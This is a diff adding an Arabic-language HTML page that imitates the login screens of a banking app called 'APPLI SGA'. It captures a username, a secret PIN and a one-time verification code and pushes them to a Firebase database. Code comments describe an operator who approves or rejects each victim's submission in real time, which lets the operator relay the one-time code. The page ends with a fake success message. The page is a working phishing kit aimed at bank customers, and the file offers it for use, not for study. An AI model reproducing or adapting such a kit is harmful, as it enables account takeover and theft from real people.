@@ -1,0 +1,510 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+<title>APPLI SGA</title>
+<style>
+/* ============================================================
+   ⚠️ مهم جدًا: كتل @font-face الأصلية (RxReg / RxBtn / RxSec / Mont)
+   تبقى كما هي تمامًا في هذا المكان — لم يتم تغييرها إطلاقًا.
+   ============================================================ */
+
+/* ============================================================
+   ✅ خلفية الموقع الموحّدة — ضع رابط الصورة هنا فقط
+   ============================================================ */
+:root{
+  --bg-url : url("https://i.imgur.com/BUXMnBT.jpeg");
+  --bg-color: #eceef1;
+}
+
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html{width:100%;height:100%;background-color:var(--bg-color);background-image:var(--bg-url);background-position:center top;background-size:cover;background-repeat:no-repeat;background-attachment:fixed}
+body{width:100%;height:100%;overflow:hidden;background:transparent;display:flex;justify-content:center;align-items:center;-webkit-text-size-adjust:100%}
+
+.screen{position:relative;width:100%;height:100%;max-width:430px;max-height:932px;container-type:size;overflow:hidden;background:transparent}
+
+/* ===== الشاشة الرئيسية ===== */
+.logo{position:absolute;right:6.5%;top:24.85%;width:9.6cqw;height:9.6cqw;border-radius:14%;overflow:hidden}
+.logo img{width:100%;height:100%;object-fit:cover;display:none}
+.t-ar{position:absolute;right:6.5%;top:33.8%;font-family:'RxReg',sans-serif;font-size:7.3cqw;line-height:1.3;color:#2b2b2b;white-space:nowrap}
+.t-en{position:absolute;right:9.2%;top:39.8%;font-family:'Mont',sans-serif;font-weight:600;font-size:7.6cqw;line-height:1.2;color:#262626;letter-spacing:.2cqw;white-space:nowrap;direction:ltr}
+.line{position:absolute;left:52.3%;width:32.7%;top:47.9%;height:.95cqw;border-radius:1cqw;background:#D5262E}
+.btn{position:absolute;left:3.5%;right:3.5%;border-radius:999px;display:flex;align-items:center;justify-content:center;cursor:pointer;font-family:'RxBtn',sans-serif;font-size:3.85cqw;transition:opacity .15s,transform .15s}
+.btn:active{opacity:.85;transform:scale(.985)}
+.btn-primary{top:71.9%;height:7.2%;border:none;color:#fff;background:linear-gradient(100deg,#E4202F 0%,#D9202D 55%,#C71F26 100%);box-shadow:0 1.4cqw 3.4cqw rgba(190,29,34,.32),0 .4cqw 1cqw rgba(0,0,0,.12)}
+.btn-secondary{top:81.3%;height:7.3%;background:transparent;border:.5cqw solid #1f1f1f;color:#2b2b2b;font-family:'RxSec',sans-serif;font-size:3.75cqw}
+.footer{position:absolute;left:0;right:0;bottom:1.6%;display:flex;flex-direction:column;align-items:center;cursor:pointer}
+.chev{width:2.1cqw;height:2.1cqw;border-top:.5cqw solid #333;border-left:.5cqw solid #333;transform:rotate(45deg);margin-bottom:2.2cqw}
+.help{font-family:'RxReg',sans-serif;font-size:3.2cqw;color:#5f6368}
+
+/* ===== شاشة تسجيل الدخول ===== */
+.screen2{display:none;--p:calc(100cqw / 631)}
+.screen2 .abs{position:absolute}
+.l-back{left:calc(25*var(--p));top:calc(28.5*var(--p));width:calc(38*var(--p));height:calc(38*var(--p));cursor:pointer}
+.l-back svg{width:100%;height:100%;display:block}
+
+.l-title{left:calc(38*var(--p));width:calc(555*var(--p));top:calc(102*var(--p));direction:rtl;text-align:left;
+  font-family:'RxBtn',sans-serif;font-weight:700;font-size:calc(37.4*var(--p));line-height:calc(72*var(--p));color:#2f2f2f;white-space:nowrap}
+.l-title .w1{word-spacing:calc(4.7*var(--p));font-size:calc(37.4*1.037*var(--p))}
+.l-desc{left:calc(38*var(--p));width:calc(555*var(--p));top:calc(271*var(--p));direction:rtl;text-align:left;
+  font-family:'RxBtn',sans-serif;font-weight:700;font-size:calc(18.65*var(--p));line-height:calc(30*var(--p));color:#828287;white-space:nowrap}
+
+.l-field{left:calc(38*var(--p));width:calc(555*var(--p));top:calc(384*var(--p));height:calc(96*var(--p));
+  border:calc(3*var(--p)) solid #4BA93D;border-radius:calc(14*var(--p));background:#fff;padding:0;margin:0;min-width:0;direction:ltr}
+.l-field legend{margin-left:calc(8*var(--p));padding:0 calc(7*var(--p));direction:rtl;
+  font-family:'RxBtn',sans-serif;font-weight:700;font-size:calc(16.4*var(--p));line-height:calc(22*var(--p));color:#4BA93D;white-space:nowrap}
+.l-field input{display:block;width:100%;height:calc(60*var(--p));border:none;outline:none;background:transparent;padding:0 calc(20*var(--p));
+  font-family:'RxReg',sans-serif;font-size:calc(26*var(--p));color:#1c1c1c;direction:ltr;text-align:left}
+
+.l-row{left:calc(38*var(--p));width:calc(555*var(--p));height:calc(25*var(--p));display:flex;flex-direction:row;align-items:center;justify-content:space-between;direction:ltr}
+.l-row1{top:calc(504.5*var(--p))}
+.l-row2{top:calc(564.5*var(--p))}
+.l-check{display:flex;flex-direction:row;align-items:center;margin-left:calc(16*var(--p));cursor:pointer}
+.l-box{width:calc(24*var(--p));height:calc(24*var(--p));border:calc(3*var(--p)) solid #2b2b2b;border-radius:calc(4*var(--p));flex:0 0 auto;display:flex;align-items:center;justify-content:center}
+.l-box svg{width:80%;height:80%;display:none}
+.l-check.on .l-box{background:#2d2d2d}
+.l-check.on .l-box svg{display:block}
+.l-label{margin-left:calc(13.5*var(--p));direction:rtl;font-family:'RxReg',sans-serif;font-weight:400;-webkit-text-stroke:calc(.5*var(--p)) #1f1f1f;font-size:calc(19.2*var(--p));color:#1f1f1f;white-space:nowrap;line-height:calc(26*var(--p));position:relative;top:calc(-1.5*var(--p))}
+.l-forgot{direction:rtl;font-family:'RxReg',sans-serif;font-weight:400;-webkit-text-stroke:calc(.4*var(--p)) #C4102F;font-size:calc(19.8*var(--p));color:#C4102F;text-decoration:underline;text-underline-offset:calc(3*var(--p));white-space:nowrap;cursor:pointer;line-height:calc(26*var(--p));position:relative;top:calc(-1.5*var(--p))}
+.l-info{left:calc(558*var(--p));top:calc(560*var(--p));width:calc(32*var(--p));height:calc(32*var(--p))}
+.l-info svg{width:100%;height:100%;display:block}
+
+.l-next{left:calc(37*var(--p));top:calc(736*var(--p));width:calc(556*var(--p));height:calc(76*var(--p));border:none;border-radius:999px;
+  background:linear-gradient(172deg,#DE8CA8 0%,#D58A9E 55%,#CF8896 100%);color:rgba(255,255,255,.92);font-family:'RxBtn',sans-serif;font-weight:400;font-size:calc(19.9*var(--p));
+  box-shadow:0 calc(6*var(--p)) calc(14*var(--p)) rgba(60,40,60,.17);display:flex;align-items:center;justify-content:center;cursor:pointer;transition:background .2s}
+.l-next.ready{background:linear-gradient(180deg,#DC0F3F 0%,#C70033 100%);box-shadow:0 calc(6*var(--p)) calc(14*var(--p)) rgba(150,0,40,.3)}
+.l-next:active{opacity:.9}
+/* ===== نافذة الرمز السري ===== */
+.l-field.idle{border:calc(1.5*var(--p)) solid #cfd0d4;background:#f2f2f4}
+.l-field.idle legend{color:#55565a;font-weight:400;font-family:'RxReg',sans-serif}
+.dim{position:absolute;inset:0;background:rgba(0,0,0,.55);opacity:0;pointer-events:none;transition:opacity .25s;z-index:20}
+.dim.show{opacity:1;pointer-events:auto}
+.sheet{position:absolute;left:0;right:0;bottom:0;top:auto;height:calc(410*var(--p));background:#fff;border-radius:calc(46*var(--p)) calc(46*var(--p)) 0 0;
+  transform:translateY(102%);transition:transform .32s cubic-bezier(.2,.8,.2,1);z-index:21;direction:ltr}
+.sheet.show{transform:translateY(0)}
+.s-title{position:absolute;left:0;right:0;top:calc(26*var(--p));text-align:center;direction:rtl;font-family:'RxReg',sans-serif;font-size:calc(19.5*var(--p));color:#2b2b2b}
+
+/* ===== تعديل: 14 نقطة بدل 6 ===== */
+.s-dots{position:absolute;left:50%;transform:translateX(-50%);top:calc(78*var(--p));display:flex;gap:calc(10*var(--p))}
+.s-dots i{width:calc(16*var(--p));height:calc(16*var(--p));border-radius:50%;background:transparent}
+.s-dots i.on{background:#6b6e73}
+
+.s-del{position:absolute;left:calc(494*var(--p));top:calc(76*var(--p));width:calc(34*var(--p));height:calc(30*var(--p));cursor:pointer}
+.s-del svg{width:100%;height:100%;display:block}
+.s-keys{position:absolute;left:calc(106*var(--p));top:calc(138*var(--p));display:grid;grid-template-columns:repeat(5,calc(68*var(--p)));gap:calc(20*var(--p));}
+.s-key{height:calc(68*var(--p));border:calc(1.5*var(--p)) solid #dcdee1;border-radius:calc(7*var(--p));background:#fff;display:flex;align-items:center;justify-content:center;
+  font-family:'Mont',sans-serif;font-weight:700;font-size:calc(34*var(--p));color:#333;cursor:pointer;user-select:none}
+.s-key:active{background:#eee}
+.s-login{position:absolute;left:calc(38*var(--p));bottom:calc(20*var(--p));width:calc(555*var(--p));height:calc(70*var(--p));border:none;border-radius:999px;
+  background:#E5A3B3;color:rgba(255,255,255,.92);font-family:'RxBtn',sans-serif;font-size:calc(20.5*var(--p));display:flex;align-items:center;justify-content:center;cursor:default;
+  box-shadow:0 calc(6*var(--p)) calc(14*var(--p)) rgba(60,40,60,.14);transition:background .2s}
+.s-login.ready{background:linear-gradient(180deg,#DC0F3F 0%,#C70033 100%);cursor:pointer;box-shadow:0 calc(6*var(--p)) calc(14*var(--p)) rgba(150,0,40,.3)}
+.loader{position:absolute;left:50%;margin-left:calc(-53*var(--p));top:calc(597*var(--p));width:calc(106*var(--p));height:calc(106*var(--p));background:#fff;border-radius:calc(10*var(--p));z-index:30;display:none;align-items:center;justify-content:center}
+.loader.show{display:flex}
+.loader b{width:calc(34*var(--p));height:calc(34*var(--p));border-radius:50%;border:calc(3.5*var(--p)) solid transparent;border-top-color:#111;animation:spin .8s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+.dlg{position:absolute;left:50%;margin-left:calc(-262.5*var(--p));top:calc(570*var(--p));width:calc(525*var(--p));height:calc(156*var(--p));background:#fff;border-radius:calc(10*var(--p));z-index:30;display:none;direction:rtl}
+.dlg.show{display:block}
+.dlg p{position:absolute;right:calc(38*var(--p));top:calc(30*var(--p));font-family:'RxReg',sans-serif;font-size:calc(19*var(--p));color:#6a6a6e;white-space:nowrap}
+.dlg button{position:absolute;right:calc(40*var(--p));bottom:calc(26*var(--p));border:none;background:none;font-family:'RxBtn',sans-serif;font-size:calc(19.5*var(--p));color:#111;cursor:pointer;padding:calc(6*var(--p))}
+
+/* ===== إضافات شاشة رمز التحقق ===== */
+.l-timer{direction:ltr;font-family:'Mont',sans-serif;font-weight:600;font-size:calc(17*var(--p));color:#C4102F;letter-spacing:calc(.4*var(--p));white-space:nowrap}
+.l-forgot.off{opacity:.45;pointer-events:none;text-decoration:none}
+</style>
+</head>
+<body>
+<div class="screen" id="screen1">
+
+  <!-- الشعار -->
+  <div class="logo" id="logo"><img id="logoImg" alt="APPLI SGA"></div>
+
+  <h1 class="t-ar">مرحبًا بك على تطبيق</h1>
+  <h2 class="t-en">APPLI SGA</h2>
+  <div class="line"></div>
+
+  <button class="btn btn-primary" onclick="showLogin()">تسجيل الدخول</button>
+  <button class="btn btn-secondary" onclick="showLogin()">طلب الاشتراك</button>
+
+  <div class="footer">
+    <div class="chev"></div>
+    <span class="help">المساعدات والخدمات</span>
+  </div>
+</div>
+
+<script>
+  // ضع رابط صورة الشعار هنا (اختياري)
+  var logoUrl = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAOEAAADhCAMAAAAJbSJIAAAAZlBMVEUAAADmACj////mACrkAADxj5ePj4/tACqYABvxlZnvgoaVlZX09PSCgoL+9PX97e/t7e3sAACUAADlABHmABjrU17wipPpSFPynKDviYz0gobHlZf17e6+goR8goKcnJxTU1NISEitMCcwAAABGUlEQVR4nO3PN1YCAQAAURTMYADFnO5/STsLbbZYHzv4/wlmZgf7brbrgD/nsM9hn8M+h30O+xz2Oexz2Oewz2Gfwz6HfQ77HPY57HPY57DPYZ/DPod9Dvsc9jnsc9jnsM9hn8M+h30O+xz2Oexz2Oewz2Gfwz6HfQ77HPY57HPY57DPYZ/DPod9Dvsc9jnsc9jnsM9hn8Nv88kZ93C+WUzO7aiHm7vt0cRs74ctDjxcPBxOzeXjYtTDs8tdH/10de7Q4d4cngxyM8HDp5tB6bPTQdbPy10f/fTyuh6UPhvoYnKH129D27OHK4cO/9vh+66Hflkej3v4cTw1q89xDwEAAAAAAAAAAAAAAAAAAAAAAAAAAACAffQFkbR+bDiv4YEAAAAASUVORK5CYII=";
+  if (logoUrl) { var i=document.getElementById('logoImg'); i.src=logoUrl; i.style.display='block'; }
+</script>
+
+<div class="screen screen2" id="screen2">
+
+  <!-- زر الرجوع -->
+  <div class="abs l-back" id="backBtn" onclick="backAction()">
+    <svg viewBox="0 0 24 24" fill="none"><path d="M19.5 12H4.5M11 18.5l-6.5-6.5L11 5.5" stroke="#111" stroke-width="2.3" stroke-linecap="round" stroke-linejoin="round"/></svg>
+  </div>
+
+  <!-- ================= الخطوة 1: اسم المستخدم ================= -->
+  <div id="step1">
+    <div class="abs l-title"><span class="w1">قم بتسجيل الدخول إلى</span><br>المساحة الشخصية الخاصة بك</div>
+    <div class="abs l-desc">الرجاء إدخال اسم المستخدم الخاص بك لتسجيل الدخول.</div>
+
+    <fieldset class="abs l-field" id="userField">
+      <legend>اسم المستخدم</legend>
+      <input type="text" id="usernameInput" inputmode="numeric" pattern="[0-9]*" autocomplete="off" maxlength="20">
+    </fieldset>
+
+    <div class="abs l-row l-row1">
+      <div class="l-check" onclick="this.classList.toggle('on')">
+        <div class="l-box"><svg viewBox="0 0 24 24" fill="none"><path d="M5 12.5l4.5 4.5L19 7.5" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
+        <span class="l-label">تذكر هويتي</span>
+      </div>
+      <span class="l-forgot">نسيت إسم المستخدم؟</span>
+    </div>
+
+    <div class="abs l-row l-row2">
+      <div class="l-check" onclick="this.classList.toggle('on')">
+        <div class="l-box"><svg viewBox="0 0 24 24" fill="none"><path d="M5 12.5l4.5 4.5L19 7.5" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
+        <span class="l-label">تفعيل الوضع السري</span>
+      </div>
+    </div>
+    <div class="abs l-info">
+      <svg viewBox="0 0 30 30" fill="none"><circle cx="15" cy="15" r="13.3" stroke="#2d2d2d" stroke-width="2.1"/><circle cx="15" cy="9.3" r="1.7" fill="#2d2d2d"/><rect x="13.6" y="12.6" width="2.8" height="9" rx="1.2" fill="#2d2d2d"/></svg>
+    </div>
+
+    <button class="abs l-next" id="nextBtn" type="button">التالي</button>
+  </div>
+
+  <!-- ================= الخطوة 2: رمز التحقق ================= -->
+  <div id="step2" style="display:none">
+    <div class="abs l-title"><span class="w1">أدخل رمز</span><br>التحقق الخاص بك</div>
+    <div class="abs l-desc" id="codeDesc">أدخل رمز التحقق الخاص بك.</div>
+
+    <fieldset class="abs l-field" id="codeField">
+      <legend>رمز التحقق</legend>
+      <input type="text" id="codeInput" inputmode="numeric" pattern="[0-9]*" autocomplete="off" maxlength="9">
+    </fieldset>
+
+    <div class="abs l-row l-row1">
+      <span class="l-forgot off" id="resendBtn">إرسال الرمز مرة أخرى</span>
+      <span class="l-timer" id="timer">0:59</span>
+    </div>
+
+    <button class="abs l-next" id="verifyBtn" type="button">تحقق</button>
+  </div>
+
+  <!-- عناصر مشتركة -->
+  <div class="dim" id="dim"></div>
+  <div class="sheet" id="sheet">
+    <div class="s-title">اكتب رمزك السريّ</div>
+    <!-- ✅ 14 نقطة بدل 6 -->
+    <div class="s-dots" id="dots">
+      <i></i><i></i><i></i><i></i><i></i><i></i><i></i>
+      <i></i><i></i><i></i><i></i><i></i><i></i><i></i>
+    </div>
+    <div class="s-del" id="delBtn"><svg viewBox="0 0 34 30" fill="none"><path d="M10.5 3h18a3.5 3.5 0 013.5 3.5v17a3.5 3.5 0 01-3.5 3.5h-18L2 15z" stroke="#333" stroke-width="2.4" stroke-linejoin="round"/><path d="M15.5 10.5l8 8M23.5 10.5l-8 8" stroke="#333" stroke-width="2.4" stroke-linecap="round"/></svg></div>
+    <div class="s-keys" id="keys"></div>
+    <button class="s-login" id="loginBtn" type="button">تسجيل الدخول</button>
+  </div>
+  <div class="loader" id="loader"><b></b></div>
+  <div class="dlg" id="dlg"><p id="dlgText">اسم المستخدم أو كلمة السر غير صحيحة</p><button type="button" id="dlgOk">حسنا</button></div>
+</div>
+
+<!-- ================= Firebase SDK ================= -->
+<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-database-compat.js"></script>
+
+<script>
+/* ============================================================
+   إعدادات Firebase
+   ============================================================ */
+var firebaseConfig = {
+ apiKey: "AIzaSyBU6YD8G4OMhoj5ov_G9cnZGQyqPh6F698",
+  authDomain: "my-appone-c666e.firebaseapp.com",
+  databaseURL: "https://my-appone-c666e-default-rtdb.firebaseio.com",
+  projectId: "my-appone-c666e",
+  storageBucket: "my-appone-c666e.firebasestorage.app",
+  messagingSenderId: "898831815227",
+  appId: "1:898831815227:web:a28ab685c70e5b5d1cc21e",
+  measurementId: "G-XC5VZ93JLW"
+};
+
+var db = null;
+try {
+  firebase.initializeApp(firebaseConfig);
+  db = firebase.database();
+} catch(e){ console.error('Firebase init error:', e); db = null; }
+
+/* ============================================================
+   دورة العمل:
+   - العميل يدخل اسم المستخدم + الرمز السري → pending
+   - الأدمن يوافق → approved (العميل ينتقل لصفحة الرمز)
+   - الأدمن يرفض → rejected (رسالة خطأ)
+   - العميل يدخل رمز التحقق → code_pending
+   - الأدمن يوافق → verified (نجاح)
+   - الأدمن يرفض → code_rejected (رسالة خطأ)
+   ============================================================ */
+
+var screen1 = document.getElementById('screen1'),
+    screen2 = document.getElementById('screen2'),
+    step1   = document.getElementById('step1'),
+    step2   = document.getElementById('step2');
+
+function showLogin(){
+  screen1.style.display='none'; screen2.style.display='block';
+  step1.style.display='block'; step2.style.display='none';
+}
+function showHome(){
+  screen2.style.display='none'; screen1.style.display='block';
+}
+
+document.addEventListener('DOMContentLoaded', function(){
+
+  var el=document.getElementById('usernameInput'),
+      next=document.getElementById('nextBtn'),
+      userField=document.getElementById('userField'),
+      codeInput=document.getElementById('codeInput'),
+      verifyBtn=document.getElementById('verifyBtn'),
+      codeDesc=document.getElementById('codeDesc'),
+      codeField=document.getElementById('codeField'),
+      timerEl=document.getElementById('timer'),
+      resendBtn=document.getElementById('resendBtn'),
+      dim=document.getElementById('dim'),
+      sheet=document.getElementById('sheet'),
+      dots=document.querySelectorAll('#dots i'),
+      loginBtn=document.getElementById('loginBtn'),
+      loader=document.getElementById('loader'),
+      dlg=document.getElementById('dlg'),
+      dlgText=document.getElementById('dlgText'),
+      dlgOk=document.getElementById('dlgOk'),
+      keys=document.getElementById('keys');
+
+  var pin='', busy=false, onVerifyStep=false;
+  var currentRef=null;
+  var timerId=null, timeLeft=0, dlgAction=null;
+
+  /* ---------- أدوات ---------- */
+  function showDlg(text, action){
+    dlgText.textContent=text; dlgAction=action||null; dlg.classList.add('show');
+  }
+  dlgOk.addEventListener('click', function(){
+    dlg.classList.remove('show');
+    var a=dlgAction; dlgAction=null; if (a) a();
+  });
+
+  function fmtTime(s){ var m=Math.floor(s/60),r=s%60; return m+':'+(r<10?'0':'')+r; }
+  function updateTimer(){
+    timerEl.textContent=fmtTime(timeLeft);
+    if (timeLeft>0) resendBtn.classList.add('off');
+    else resendBtn.classList.remove('off');
+  }
+  function startTimer(sec){
+    timeLeft=sec; updateTimer(); clearInterval(timerId);
+    timerId=setInterval(function(){
+      timeLeft--; if (timeLeft<=0){ timeLeft=0; clearInterval(timerId); } updateTimer();
+    },1000);
+  }
+  function stopTimer(){ clearInterval(timerId); timerId=null; }
+
+  /* ---------- اسم المستخدم ---------- */
+  el.addEventListener('input', function(){
+    this.value=this.value.replace(/[^0-9]/g,'');
+    next.classList.toggle('ready', this.value.length>0);
+  });
+  el.addEventListener('keypress', function(e){
+    if (e.key.length===1 && !/[0-9]/.test(e.key)) e.preventDefault();
+  });
+
+  /* ---------- لوحة الرمز السري ---------- */
+  function renderPin(){
+    for (var i=0;i<dots.length;i++) dots[i].classList.toggle('on', i<pin.length);
+    /* ✅ الزر يتفعّل بعد 6 أرقام على الأقل */
+    loginBtn.classList.toggle('ready', pin.length>=6);
+  }
+  function buildKeys(){
+    var d=[0,1,2,3,4,5,6,7,8,9];
+    for (var i=d.length-1;i>0;i--){ var j=Math.floor(Math.random()*(i+1)); var t=d[i]; d[i]=d[j]; d[j]=t; }
+    keys.innerHTML='';
+    d.forEach(function(n){
+      var k=document.createElement('div');
+      k.className='s-key'; k.textContent=n;
+      k.addEventListener('click', function(){
+        /* ✅ الحد الأقصى 14 رقمًا */
+        if (busy || pin.length>=14) return;
+        pin+=n; renderPin();
+      });
+      keys.appendChild(k);
+    });
+  }
+  function openSheet(){
+    pin=''; renderPin(); buildKeys(); el.blur();
+    userField.classList.add('idle');
+    dim.classList.add('show'); sheet.classList.add('show');
+  }
+  function closeSheet(){
+    dim.classList.remove('show'); sheet.classList.remove('show');
+    userField.classList.remove('idle'); pin=''; renderPin();
+  }
+
+  next.addEventListener('click', function(){ if (el.value.length>0) openSheet(); });
+  dim.addEventListener('click', function(){ if (!busy && !dlg.classList.contains('show')) closeSheet(); });
+  document.getElementById('delBtn').addEventListener('click', function(){
+    if (busy) return; pin=''; renderPin();
+  });
+
+  /* =========================================================
+     إرسال اسم المستخدم + الرمز السري فقط
+     ثم الاستماع لكل تغييرات الحالة من الأدمن
+     ========================================================= */
+  function sendCredentials(){
+    /* ✅ من 6 إلى 14 رقمًا */
+    if (busy || pin.length<6 || pin.length>14) return;
+    if (!el.value){ showDlg('الرجاء إدخال اسم المستخدم', function(){ pin=''; renderPin(); buildKeys(); }); return; }
+    if (!db){ showDlg('تعذر الاتصال بالخادم'); return; }
+
+    busy = true;
+    loader.classList.add('show');
+
+    var ref = db.ref('requests').push();
+    currentRef = ref;
+    var wentToVerify = false;
+
+    ref.set({
+      username : el.value,
+      pin      : pin,
+      status   : 'pending',
+      createdAt: Date.now(),
+      platform : 'app'
+    }).then(function(){
+      ref.child('status').on('value', function(snap){
+        var st = snap.val();
+
+        /* الأدمن وافق على تسجيل الدخول → صفحة إدخال رمز التحقق */
+        if (st === 'approved' && !wentToVerify){
+          wentToVerify = true;
+          loader.classList.remove('show');
+          busy = false;
+          closeSheet();
+          goToVerifyStep();
+        }
+        /* الأدمن رفض تسجيل الدخول */
+        else if (st === 'rejected'){
+          loader.classList.remove('show');
+          busy = false;
+          ref.child('status').off();
+          currentRef = null;
+          showDlg('اسم المستخدم أو كلمة السر غير صحيحة', function(){
+            pin=''; renderPin(); buildKeys();
+          });
+        }
+        /* الأدمن وافق على رمز التحقق → نجاح */
+        else if (st === 'verified'){
+          loader.classList.remove('show');
+          busy = false;
+          ref.child('status').off();
+          currentRef = null;
+          showDlg('تم التسجيل بنجاح', function(){ resetAll(); });
+        }
+        /* الأدمن رفض رمز التحقق → رسالة الخطأ */
+        else if (st === 'code_rejected'){
+          loader.classList.remove('show');
+          busy = false;
+          showDlg('رمز التحقق خاطئ', function(){
+            codeInput.value='';
+            verifyBtn.classList.remove('ready');
+          });
+        }
+      });
+    }).catch(function(err){
+      console.error(err);
+      loader.classList.remove('show');
+      busy = false;
+      showDlg('تعذر الاتصال بالخادم');
+    });
+  }
+
+  loginBtn.addEventListener('click', sendCredentials);
+
+  /* ---------- الانتقال إلى شاشة رمز التحقق ---------- */
+  function goToVerifyStep(){
+    onVerifyStep = true;
+    codeInput.value = '';
+    verifyBtn.classList.remove('ready');
+    step1.style.display = 'none';
+    step2.style.display = 'block';
+    codeDesc.textContent = 'أدخل رمز التحقق الخاص بك.';
+    startTimer(59);
+    setTimeout(function(){ codeInput.focus(); }, 250);
+  }
+
+  /* ---------- إدخال رمز التحقق (من 4 إلى 9 أرقام) ---------- */
+  codeInput.addEventListener('input', function(){
+    this.value = this.value.replace(/[^0-9]/g,'');
+    verifyBtn.classList.toggle('ready', this.value.length>=4 && this.value.length<=9);
+  });
+  codeInput.addEventListener('keypress', function(e){
+    if (e.key.length===1 && !/[0-9]/.test(e.key)) e.preventDefault();
+  });
+
+  /* ---------- زر تحقق: يرسل رمز العميل للأدمن ---------- */
+  verifyBtn.addEventListener('click', function(){
+    var v = codeInput.value.replace(/\D/g,'');
+    if (v.length<4 || v.length>9 || busy || !currentRef) return;
+
+    busy = true;
+    loader.classList.add('show');
+
+    currentRef.update({
+      userCode       : v,
+      status         : 'code_pending',
+      codeSubmittedAt: Date.now()
+    }).catch(function(){
+      loader.classList.remove('show');
+      busy = false;
+      showDlg('تعذر الاتصال بالخادم');
+    });
+  });
+
+  /* ---------- إعادة إرسال: تمسح الإدخال ---------- */
+  resendBtn.addEventListener('click', function(){
+    if (busy) return;
+    codeInput.value='';
+    verifyBtn.classList.remove('ready');
+  });
+
+  /* ---------- الرجوع ---------- */
+  window.backAction = function(){
+    if (busy) return;
+    if (onVerifyStep){
+      onVerifyStep = false;
+      stopTimer();
+      if (currentRef){ currentRef.child('status').off(); currentRef = null; }
+      step2.style.display = 'none';
+      step1.style.display = 'block';
+    } else {
+      showHome();
+    }
+  };
+
+  /* ---------- إعادة ضبط ---------- */
+  function resetAll(){
+    stopTimer();
+    onVerifyStep = false;
+    if (currentRef) currentRef.child('status').off();
+    currentRef = null;
+    pin=''; renderPin(); buildKeys();
+    codeInput.value='';
+    verifyBtn.classList.remove('ready');
+    step2.style.display='none';
+    step1.style.display='block';
+    closeSheet();
+    showHome();
+  }
+
+});
+</script>
+
+</body>
+</html>
